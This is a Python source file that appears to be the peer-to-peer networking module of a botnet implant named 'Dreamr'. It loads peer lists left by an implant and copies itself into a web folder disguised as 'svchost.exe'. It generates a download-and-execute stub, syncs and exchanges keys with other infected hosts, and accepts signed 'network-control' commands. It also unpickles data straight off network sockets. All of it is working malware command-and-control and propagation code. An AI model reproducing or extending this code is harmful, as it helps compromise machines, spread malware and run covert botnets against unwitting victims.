import threading
import socket
import time
import random
import Queue
import IPy
import pickle
import urllib2
import tempfile

from config import *
from core import *
from hostlist import *
from message import *
from config import *
from shutil import copyfile
from shutil import move
from callback import *
import win32event, win32api, winerror
import win32console, win32gui
from callback import *
from bootstrap import *

from Context import Dreamr

# Listens for connections, makes connections
class ProtocolThread(threading.Thread):
	hazip = 0
	hostAddr = ""
	server = None
	client = None
	lucid = None # If lucid is a message, then the message gets sent, and the protocol thread shuts down

	# Constructor to handle network protocol
	# ipaddr address of primary interface
	def __init__(self, lucid = False):# peace and love
		threading.Thread.__init__(self) # calling super method
		global WebPath
		global KeyPath
		self.lucid = lucid
		self.hostAddr = socket.gethostbyname(socket.gethostname())
		Dreamr.startCrypto()

	def run(self):
		global BasePath
		global MT_B64
		Serving = False
		tempdir = tempfile.gettempdir()

		# Try to open the keystore
		Dreamr.hostlist = Dreamr.keystore.getServerList()

		# MANIFEST HOSTLIST LOADER
		if (len(Dreamr.hostlist) == 0):
			content = ""
			# read sleeping.hosts from temp created by dreamr implant
			try:
				with open("%s\\sleeping.hosts" % tempdir, "r") as handle:
					for host in handle:
						host = host.strip()
						try:
							socket.inet_aton(host)
							Dreamr.keystore.addPendingHost(host)
						except Exception as e:
							print("skipping bad sleeping ip -> %s" % str(e))
			except Exception as e:
				print("no sleeping hosts -> %s" % str(e))
		else:
			print("please hosts")

		# Initial test of whether or not this host is a server
		Dreamr.server = self.isPublic(self.hostAddr)

		### COMMUNICATION LOGIC ###
		while(True):

			### DREAMR ###
			if (self.lucid == False):

				# Repeat server test and start server if not started when server flag is set
				Dreamr.server = self.isPublic(self.hostAddr)
				if (Dreamr.server and Dreamr.external):
					debug("protocol", "register self %s" % Dreamr.external)
					Dreamr.keystore.validateHost(NetworkHost(Dreamr.external, Dreamr.server, Dreamr.crypt.DRMPublicKey, int(time.time())))

				if (not Serving):
					Serving = True
					DreamrServerThread().start()

				# Update the hostlist, becuase we may have learned about new hosts to talk to
				Dreamr.hostlist = Dreamr.keystore.getServerList()

				# Write the smaller dl/exec stub in www
				debug("protocol", "generate stub")
				hostlist = Dreamr.hostlist
				print(hostlist)
				generateStub(hostlist)

				# STAMP HOSTLIST MANIFEST

				# STAMP BINARY HOSTLIST
				# TODO compat implant
				# try:
				# 	os.chdir(WebPath)
				# 	drmhl = DreamrHostList(WebPath, "dreamr.exe")
				# 	if (drmhl.isGood()):
				# 		print("binary stamp")
				# 		drmhl.saveHostList(Dreamr.hostlist) # APPEND SELF IF SERVER
				# except Exception as e:
				# 	debug("protocol", "stamp fail -> %s" % str(e))

				# Copy self to web dir
				try:
					os.chdir(WebPath)
					copyfile(BinaryLocation, "svchost.exe")
				except:
					debug("protocol", "copy self -> %s" % str(e))

				# Write host internal address and put in www for port check verification
				try:
					with open("host.txt", "wb") as handle:
						handle.write(self.hostAddr)
				except Exception as e:
					print("write host.txt fail")

				# For each host in the hostlist, sync with host
				for address in Dreamr.hostlist:
					# Avoid sync with self
					if (address == "127.0.0.1" or address == self.hostAddr or address == Dreamr.external):
						continue
					self.sendMessage(address, TYPE_NETWORK_SYNC, "still love you")
					os.chdir(WebPath)
					time.sleep(5)

				# These are hosts that we're supposed to exchange keys with
				print("pop hosts")
				address = Dreamr.keystore.popPendingHost()
				if (address):
					self.sendMessage(address, TYPE_NETWORK_TEST, "still love you")

				# Update our IP address
				Dreamr.internal = socket.gethostbyname(socket.gethostname())

			### LUCID DREAMR ###
			else:
				# send command and exit
				msgDest = self.lucid[0]
				msgType = self.lucid[1]
				msgData = self.lucid[2]
				if (len(self.lucid) == 5):
					msgReturn = self.lucid[3]
				else:
					msgReturn = None

				if (msgDest and msgType and msgData):
					self.sendMessage(msgDest, msgType, msgData, msgReturn)

				countdown = 10
				while countdown > 0:
					countdown -= 1
					print("exiting in %s seconds" % countdown)
					time.sleep(1)
				return

			# Update our external IP address
			self.hostAddr = socket.gethostbyname(socket.gethostname())
			time.sleep(3)

			# Check to see if port is actually open
			if (self.hazip <3 and not Dreamr.server):
				debug("portcheck", "external port check")
				try:
					targetURL = "http://%s:8000/host.txt" % Dreamr.external
					response = urllib2.urlopen(targetURL).read()
					if Dreamr.internal in response: # see that the local IP maps to the global one
						print("BECOME_SERVER_PORT_CHECK")
						Dreamr.server = True
						Dreamr.nat = True
				except Exception as e:
					debug("portcheck", str(e))
				self.hazip += 1

			# Load extra hosts from a centralized service for bootstrap
			#if (not self.lucid):
			#	HTTPBootstrapThread("10.0.0.1").start()

			# Sleep for a while
			os.chdir(WebPath)
			time.sleep(random.randint(10, 30))

	# Send message the easy way
	def sendMessage(self, msgDest, msgType, msgContent, msgReturn = None):
		if (Dreamr.server or self.lucid):
			msgId = "1:%s%s" % (random.randint(10000, 99999), int(time.time()))
		else:
			msgId = "0:%s%s" % (random.randint(10000, 99999), int(time.time()))
		msgTime = int(time.time())
		if (DEBUG_MODE):
			msgSender = Dreamr.internal
		else:
			msgSender = Dreamr.external
		msgSenderPublic = Dreamr.crypt.DRMPublicKey
		msgRecipientPublic = Dreamr.keystore.byAddr(msgDest)
		message = None

		# no crypto (test types)
		if (int(msgType) < 10):
			message = PeerMessage(msgId, msgType, msgTime, msgReturn, msgSender, msgSenderPublic, msgContent)
			DreamrClientThread(msgDest, pickle.dumps(message)).start()
			time.sleep(TCP_TIMEOUT)
			return

		# We need keys for everything below this point
		if (not msgRecipientPublic):
			self.sendMessage(msgDest, TYPE_NETWORK_TEST, "still love you")
			i = 0
			while (i<5):
				print("waiting for public key")
				time.sleep(7)
				msgRecipientPublic = Dreamr.keystore.byAddr(msgDest)
				if (msgRecipientPublic):
					print("aquired host's public key")
					break
				i += 1

			if (not msgRecipientPublic):
				print("could not acquire host's public key")
				return

		# sign and encrypt
		if (msgType >= 10 and msgType < 20):
			msgData = Dreamr.crypt.encryptAndSign(msgContent, msgRecipientPublic)
			message = PeerMessage(msgId, msgType, msgTime, "", msgSender, msgSenderPublic, msgData)

		# signed only (trusted and signed)
		if (msgType >= 20):
			msgContent = pickle.dumps(msgContent)
			signature = Dreamr.crypt.signMessage(msgContent)
			message = PeerMessage(msgId, msgType, msgTime, msgReturn, "network-control", msgSenderPublic, [msgContent, signature])

		# Send remaining messages
		if (message):
			DreamrClientThread(msgDest, pickle.dumps(message)).start()
			time.sleep(TCP_TIMEOUT)
		return

	def isPublic(self, ipaddr):
		if (Dreamr.server == True):
			return True
		else:

			# Check if host's interface address is public
			addrType = IPy.IP(ipaddr).iptype()
			if (addrType == "PUBLIC"):
				print("BECOME_SERVER")
				return True

			# Server Debug
			if (DEBUG_MODE):
				print("BECOME_SERVER_DEBUG")
				return True
		return False

# SERVER HANDLER THREAD | Fork off a client thread to handle the socket
# This is a connected client or server!
class DreamrServerHandler(threading.Thread):
	clientAddr = ""
	client = None

	def __init__(self, client):
		threading.Thread.__init__(self)
		self.client = client[0]
		print("handle client")

	# Interact with the connected client
	def run(self):
		if (self.client):
			try:
				data = self.receive()
				if (data):
					msgData = pickle.dumps(DreamrMessageHandler().handleMessage(pickle.loads(data)))
					if (msgData):
						self.client.send(msgData)
			except Exception as e:
				print("server_handler -> %s" % str(e))
			try:
				self.client.shutdown(2)
				debug("protocol", "socket shutdown")
			except:
				pass
			self.client.close()

	# to receive messages of any length
	def receive(self):

		# make socket non-blocking
		self.client.setblocking(0)

		# data collection vars
		result = ""
		data = ""
		lastTime = int(time.time())
		while True:
			if (result and (int(time.time()) - lastTime > TCP_TIMEOUT)):
				break
			elif (int(time.time()) - lastTime) > TCP_TIMEOUT * 2:
				break
			try:
				data = self.client.recv(BUFFER_SIZE)
				if (data):
					result += data
					lastTime = int(time.time())
			except Exception as e:
				#print("recv -> %s" % str(e))
				pass
			# To prevent CPU usage problems
			time.sleep(0.250)
		return result

# SERVER THREAD | Blocking/accepting thread
class DreamrServerThread(threading.Thread):
	# Constructor to handle network protocol
	# ipaddr address of primary interface
	server = None

	def __init__(self):
		threading.Thread.__init__(self)
		if (not self.server):
			print("start server")
			self.server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			self.server.bind(("", TCP_PORT)) # leave empty
			self.server.listen(TCP_TIMEOUT)
		return

	def run(self):
		# Server runs threads forever
		while True:
			if (Dreamr.exiting):
				print("server exit")
				break
			self.client = self.server.accept()
			if (self.client):
				DreamrServerHandler(self.client).start()
		try:
			self.server.shutdown(2)
		except:
			pass
		self.server.close()

# CLIENT | Initiate a connection to a peer
class DreamrClientThread(threading.Thread):
	msgDest = ""
	hostAddr = ""
	port = 0
	data = ""
	sock = None

	# This all gets done in a separate thread for freedom
	def __init__(self, msgDest, data):
		self.msgDest = msgDest
		self.port = TCP_PORT
		self.data = data
		self.hostAddr = socket.gethostbyname(socket.gethostname())
		threading.Thread.__init__(self)
		try:
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			if (self.sock):
				self.sock.settimeout(TCP_TIMEOUT)
				self.sock.connect((self.msgDest, TCP_PORT))
		except Exception as e:
			pass
		return

	def run(self):
		if (self.sock and self.data):
			# Handle sending the data without crashing
			try:
				self.sock.send(self.data)
			except Exception as e:
				pass
			# Handle blocking for a repsonse from the message handler, and returning a message
			try:
				response = pickle.loads(self.receive())
				if (isinstance(response, PeerMessage)):
					DreamrMessageHandler().handleMessage(response) # Response == True, ignore return
			except Exception as e:
				#debug("protocol", "client -> %s" % str(e))
				pass
			#if (self.sock): trying to keep port free
			try:
				self.sock.shutdown(2)
				print("socket shut down")
			except:	
				pass
		return


	# to receive messages of any length
	def receive(self):

		# make socket non-blocking
		self.sock.setblocking(0)

		# data collection vars
		result = ""
		data = ""
		lastTime = int(time.time())
		while True:
			if (result and (int(time.time()) - lastTime > TCP_TIMEOUT)):
				break
			elif (int(time.time()) - lastTime) > TCP_TIMEOUT * 2:
				break
			try:
				data = self.sock.recv(BUFFER_SIZE)
				if (data):
					result += data
					lastTime = int(time.time())
			except Exception as e:
				#print("recv -> %s" % str(e))
				pass
			# To prevent CPU usage problems
			time.sleep(0.250)
		return result
